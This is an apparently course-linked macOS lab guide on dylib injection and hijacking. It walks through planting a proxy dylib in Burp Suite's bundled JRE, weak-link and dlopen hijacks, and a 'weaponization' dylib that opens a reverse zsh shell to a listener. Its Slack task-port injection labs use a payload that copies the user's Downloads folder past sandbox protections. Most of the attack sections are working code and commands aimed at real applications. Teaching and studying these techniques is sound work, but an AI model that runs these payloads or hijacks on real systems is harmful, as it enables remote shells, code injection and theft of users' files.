# Lab Guide: Dylib Injection & Hijacking (Expanded)

**Target Software Checklist**:
Ensure you have the following installed to conduct "Real World" labs:
*   **Burp Suite Community Edition** (Latest): Used for `keytool` and `rmiregistry` hijacking.
*   **Zoom** (v5.4.9 or similar): Used for `airhost` RPATH recon.
*   **Proxyman**: Used for Weak Dylib discovery.
*   **Xcode Command Line Tools**: For `gcc`, `otool`, `codesign`, `install_name_tool`.
*   **LLDB (or pwndbg-lldb)**: For AMFI debugging.

**Prerequisites**:
Ensure you have the following files in `~/osmr/osmr2/socam/labs/`:
*   `example.c` (Payload Source)
*   `hello.c` (Target Source)
*   `hijack.m` (Proxy Source)
*   `dltest.c` (Dlopen Source)
*   `weak_target.c` (Simulated Source - Create this in Lab 4b)

---

## Lab 1: Mechanics of Injection
**Goal**: Prove you can inject code into a standard binary. Understand the `constructor` attribute.

**1. Create the Payload (`example.c`)**
```c
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
> **Context**: The `constructor` attribute puts this function in the `__mod_init_func` section. `dyld` runs these functions before `main()`.

**2. Compile**
```bash
# Compile the Dylib
# -dynamiclib: Tells clang to build a MH_DYLIB machin-o type
gcc -dynamiclib labs/example.c -o example.dylib

# Compile the Target
gcc labs/hello.c -o hello
```

**3. Execute Injection**
```bash
DYLD_INSERT_LIBRARIES=example.dylib ./hello
```
> **Troubleshooting**: If this fails, check if `SIP` is stripping variables (rare on custom binaries) or if you made a typo in the filename. The path can be relative or absolute.

*   **Check**: Did you see `[+] dylib constructor called`?
*   **Check**: Run `log stream --style syslog | grep "constructor"` in another tab. Run injection again. Did it verify?

---

## Lab 2: The Restrictions Demo (with LLDB/Pwndbg)
**Goal**: Verify that Hardened Runtime blocks injection and verify *why* using a debugger.

**1. Sign the Binary**
```bash
cp hello hello-signed
# Sign with Hardened Runtime enabled
codesign -s - --option=runtime hello-signed
```

**2. Debugging the Block**
We will attach `lldb` (or `pwndbg-lldb`) to see the restriction logic.
*   **Note for Pwndbg Users**: Standard `lldb` commands work, but `pwndbg` gives you a better context display. Use `context` or `regs` to see registers clearly.

```bash
# Wait for the process to start (Wait for Attach)
lldb -n hello-signed --u --waitfor
```
*   In another terminal: `DYLD_INSERT_LIBRARIES=example.dylib ./hello-signed`
*   In LLDB: You will catch the process start.

**Breakpoints**:
*   `b dyld` (To catch dyld entry)
*   `b amfi_check_dyld_policy_self` (If symbols available) or `b __mac_syscall`

When you hit the breakpoint:
*   **Inspect**: Look at the registers. The return value from the syscall (in `RAX`/`X0`) determines if variables are pruned.

---

## Lab 3: Finding Vulnerabilities (The Hunter's Methodology)
**Goal**: Discover vulnerabilities *from scratch*. No guided targets. This teaches you how to fish.

**Theory**: You are looking for a disconnect between *Where dyld looks* (`LC_RPATH`) and *What exists* (File System).

**Phase 1: Static Analysis (The Otool Loop)**
Pick a target (e.g., Zoom or Burp).
1.  **Dump Commands**: `otool -l <binary>`.
2.  **Filter**: Look for `LC_RPATH` and `LC_LOAD_WEAK_DYLIB`.
    *   *Bad Pattern*: `@loader_path/../Frameworks` (Is it writable?)
    *   *Bad Pattern*: `@loader_path/.` (Current Directory - Very Bad)
    *   *Bad Pattern (Weak)*: `LC_LOAD_WEAK_DYLIB` pointing to a missing file.

**Phase 2: Dynamic Analysis (The fs_usage Hunt)**
Static analysis is hard just reading text. Let's watch the OS fail in real time.
1.  **Set the Trap**:
    ```bash
    sudo fs_usage -w -f filesys | grep -E "open|stat" | grep -v "System"
    ```
    *   *Explanation*: We watch file system events, filtering out the noisy `/System` reads.
2.  **Launch the App**: Run your target app.
3.  **Analyze the Logs**:
    *   Look for `No such file` or `ENOENT`.
    *   **The Golden Ticket**: `stat64 /Applications/App.app/Contents/Frameworks/Lib.dylib -> No such file`.
    *   **Verification**: Check permissions on `/Applications/App.app/Contents/Frameworks/`. Can you write there? If yes, **HIJACK**.

---

## Lab 4a: Hijacking Burp Suite (Method 1: RPATH Proxy)
**Goal**: Hijack `keytool` by exploiting a misconfigured RPATH. This involves creating a Proxy Dylib.

**1. Verify the Vulnerability**
Run `otool` on the target binary.
```bash
otool -l "/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/keytool" | grep RPATH -A 2
```
*   **Confirm**: You see `path @loader_path/.`.
*   **Meaning**: The app looks in its own folder (`bin/`) *prioritized*.

**2. The Target Library**
The app needs `libjli.dylib`. It normally loads it from `../lib/libjli.dylib`. We will plant a fake one in `bin/libjli.dylib`.

**3. Compile the Proxy (Detailed)**
We must re-export the real library's symbols using separate compilation flags.
```bash
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 \
-framework Foundation labs/hijack.m \
-Wl,-reexport_library,"/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib" \
-o hijack.dylib
```
> **Flag Analysis**: `-Wl` passes the following comma-separated option to the linker. `-reexport_library` creates the forwarding table.

**4. Link Fix (Crucial Step)**
We must fix the "Install Name" and the "Re-export Path".
```bash
install_name_tool -change @rpath/libjli.dylib \
"/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib" \
hijack.dylib
```
> **Tool Usage**: We change the "Dependency Name" from the relative `@rpath` entry to the **Absolute Path** of the victim.

**5. Deploy**
Copy the malicious dylib to the vulnerable `bin/` directory.
```bash
cp hijack.dylib "/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib"
```

**6. Trigger**
Run the tool.
```bash
"/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/keytool"
```
*   **Success**: You should see the Hijack Message printed to the console.

---

## Lab 4b: Weak Dylib Hijacking (Method 2: Simulated Target)
**Goal**: Exploit `LC_LOAD_WEAK_DYLIB`.
**Context**: Finding a real-world weak dylib (like Hopper Disassembler) often requires older versions or disabling SIP. To guarantee you learn the *mechanics* of the attack, we will build a vulnerable simulator.

**1. Create the Vulnerable Simulator (`weak_target.c`)**
```c
#include <stdio.h>
// Declare a function from a library we will weakly link
void weak_function(void) __attribute__((weak_import));

int main() {
    printf("[*] Target running...\n");
    if (weak_function) {
        printf("[!] Weak function found! Calling it...\n");
        weak_function();
    } else {
        printf("[-] Weak function NOT found. Continuing normally.\n");
    }
    return 0;
}
```

**2. Create the "Missing" Library**
We need a library to link against initially, even if we delete it later.
```bash
# Create a dummy c file
echo 'void weak_function() { printf("[+] I AM THE MALICIOUS DYLIB!\n"); }' > weak_lib.c
# Compile it
gcc -dynamiclib weak_lib.c -o libweak.dylib
```

**3. Compile the Vulnerable Target**
We use `-weak_library` to tell the linker "It's okay if this is missing at runtime".
```bash
gcc weak_target.c -o weak_target -weak_library libweak.dylib
```

**4. Verify the Weak Link**
Run `otool` to see the `LC_LOAD_WEAK_DYLIB` command.
```bash
otool -l weak_target | grep "LC_LOAD_WEAK_DYLIB" -A 2
```
*   **Confirm**: You verify this is a WEAK load command.

**5. The Setup (Simulate the Vulnerability)**
Delete the library. The app should still run.
```bash
rm libweak.dylib
./weak_target
```
*   **Result**: "[-] Weak function NOT found. Continuing normally."

**6. The Exploit**
Now, you are the attacker. You just found this binary and saw the `LC_LOAD_WEAK_DYLIB` pointing to `./libweak.dylib` (or whatever path).
Re-compile your *Malicious* dylib to that name.
```bash
# We can use our existing example code or the dummy code
gcc -dynamiclib labs/example.c -o libweak.dylib
```
Run the target again.
```bash
./weak_target
```
*   **Success**: `[+] dylib constructor called...`

---

## Lab 6: Dlopen Hijacking
**Goal**: Exploit `dlopen` using relative paths.

**1. Create the Test Tool (`dltest.c`)**
```c
#include <dlfcn.h>
int main() {
    // Tries to load a library without a path.
    // This triggers the search algorithm: DYLD_VAR -> RPATH -> CWD -> /usr/lib
    dlopen("doesntexist.dylib", 1);
}
```
Compile: `gcc labs/dltest.c -o dltest`

**2. Monitor the Failures**
Open a new tab and start `fs_usage` to watch the file system.
```bash
sudo fs_usage -w -f filesys | grep doesntexist
```

**3. Run the Tool**
```bash
./dltest
```
*   **Watch Tab 1**: You will see it try to `open()` the file `./doesntexist.dylib`. It is looking in the Current Directory.

**4. Exploit**
Compile our payload into the Current Directory.
```bash
gcc -dynamiclib labs/example.c -o doesntexist.dylib
```
Run `dltest` again.
*   **Success**: Injection successful.

---

## Bonus: Weaponization (The Reverse Shell)
**Goal**: Move beyond "Hello World" to a real shell.

**1. Create `shell.c`**
```c
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

__attribute__((constructor))
void reverse_shell() {
    int sockfd;
    struct sockaddr_in serv_addr;

    // Change IP/PORT to your listener
    char *ip = "127.0.0.1";
    int port = 4444;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &serv_addr.sin_addr);

    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == 0) {
        dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);
        execl("/bin/zsh", "zsh", NULL);
    }
}
```

**2. Compile**
```bash
gcc -dynamiclib shell.c -o shell.dylib
```

**3. Listen & Attack**
*   Terminal 1: `nc -lvp 4444`
*   Terminal 2: `DYLD_INSERT_LIBRARIES=shell.dylib ./hello`
*   **Result**: Check Terminal 1. You have a shell.

---

## Lab 7: Mach IPC Mechanics (Sender and Receiver)
**Goal**: Observe how two isolated tasks use the Bootstrap Server (`launchd`) to establish a Mach message connection.

**1. Create the Receiver (`receiver.c`)**
```c
#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {
    mach_port_t port;
    // 1. Allocate a port (RECEIVE right)
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    // 2. Insert a SEND right
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    // 3. Register with Bootstrap Server
    bootstrap_register(bootstrap_port, "org.offsec.example", port);
    
    // 4. Wait for a message
    struct {
        mach_msg_header_t header;
        char text[10];
        int number;
        mach_msg_trailer_t trailer;
    } message;
    
    printf("Listing on org.offsec.example...\n");
    mach_msg(&message.header, MACH_RCV_MSG, 0, sizeof(message), port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    printf("Received: Text: %s, Number: %d\n", message.text, message.number);
}
```

**2. Create the Sender (`sender.c`)**
```c
#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {
    mach_port_t port;
    // 1. Lookup the service to get a SEND right
    bootstrap_look_up(bootstrap_port, "org.offsec.example", &port);
    
    // 2. Construct the message
    struct {
        mach_msg_header_t header;
        char text[10];
        int number;
    } message;
    
    message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    message.header.msgh_remote_port = port;
    message.header.msgh_local_port = MACH_PORT_NULL;
    strncpy(message.text, "Hello", sizeof(message.text));
    message.number = 35;
    
    // 3. Send the message
    mach_msg(&message.header, MACH_SEND_MSG, sizeof(message), 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    printf("Sent a message to receiver.\n");
}
```

**3. Test the Connection**
Compile both:
```bash
gcc labs/receiver.c -o receiver
gcc labs/sender.c -o sender
```
Run `./receiver` in one tab. It will block.
Run `./sender` in a second tab.
*   **Result**: The Receiver prints "Text: Hello, Number: 35".

---

## Lab 8: Injecting execv Shellcode into Slack (Task Port Hijack)
**Goal**: Exploit an application entirely via its Task Port to bypass Sandbox protections and steal `~/Downloads`.

**1. Verification setup**
Ensure Slack is running. *If Slack isn't on your lab VM, you can test this on any dummy app by artificially signing it with the `com.apple.security.get-task-allow` entitlement.*
```bash
# Verify it has no files currently in the colors sandbox directory
ls -l ~/Library/Colors/
```

**2. Compile the Wrapper Code**
We will provide the file `slack-inject.m` which attempts to run `task_for_pid()` and intelligently injects raw ARM64 shellcode acting as our data export payload.
```bash
gcc -framework Foundation -framework AppKit labs/slack-inject.m -o slack-inject
```

**3. Execute the Injection**
You must run this as `root` so the kernel grants you the task port of another distinct user-level process.
```bash
sudo ./slack-inject
```
*   **Look For**: 
    1. "Got access to the task port..."
    2. "Allocated remote code placeholder..."
    3. "Exploit succeeded! Check ~/Library/Colors/"
    
**4. Verify the Exfil**
```bash
ls -l ~/Library/Colors/
```
*   **Success**: The `Downloads` directory has been forcefully copied into this directory because Slack bypassed privacy/sandboxing restriction prompts for us.

---

## Lab 9: Injecting a Dylib into Slack (The Professional Standard)
**Goal**: Subvert threading duality restrictions by natively promoting a Mach thread to load a Dynamic Library.

**1. Create the Payload (`inject.c`)**
```c
#include <stdlib.h>

__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
    system("cp -r ~/Downloads ~/Library/Colors/");
    exit(0);
}
```
Compile the payload into a standard universal Dylib:
```bash
gcc -dynamiclib labs/inject.c -o ~/Library/Colors/inject.dylib
```

**2. The Dynamic Loader Shellcode (`slack-inject-dylib.m`)**
This source code is provided in your lab material. It robustly handles the following:
1. Allocates secure memory mapped inside Slack.
2. Identifies the memory addresses of `dlopen`, `pthread_create_from_mach_thread`, and `pthread_exit`.
3. Patches a pre-compiled, highly-optimized ARM64 shellcode in-memory replacing placeholder bytes (e.g. `DLOPEN__`).
4. Injects and spawns the Mach thread that autonomously promotes itself to a pthread.

**3. Compile and Execute**
```bash
gcc -framework Foundation -framework AppKit labs/slack-inject-dylib.m -o slack-inject-dylib
# Make sure to clear the Colors sanctuary directory first from Lab 8
rm -rf ~/Library/Colors/Downloads

sudo ./slack-inject-dylib
```

**4. Validate**
```bash
ls -l ~/Library/Colors/
```
*   **Success**: You successfully forced an external sandboxed process to seamlessly spawn a verified POSIX thread, load an external arbitrary dylib, and blindly execute its target data operations.
